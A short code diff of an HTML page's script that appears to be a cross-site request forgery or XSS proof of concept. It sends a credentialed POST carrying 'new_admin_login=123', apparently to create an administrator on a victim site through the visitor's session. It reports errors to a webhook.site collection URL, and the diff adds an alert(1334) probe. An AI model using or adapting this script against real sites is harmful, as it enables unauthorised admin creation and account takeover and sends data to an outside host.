@@ -16,9 +16,9 @@
             method: 'POST',
             credentials: 'include',
             headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
+                'Content-Type': 'application/json'
             },
-            body: 'new_admin_login=123'
+            body: {'new_admin_login':123}
         });
         
         const result = await response.text();
@@ -86,7 +86,7 @@
     } catch (error) {
         // Отправляем ошибку основного запроса на webhook
         try {
-            await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+            await fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -108,6 +108,7 @@
         }
     }
 })();
+    alert(1334)
 </script>
 </body>
 </html>
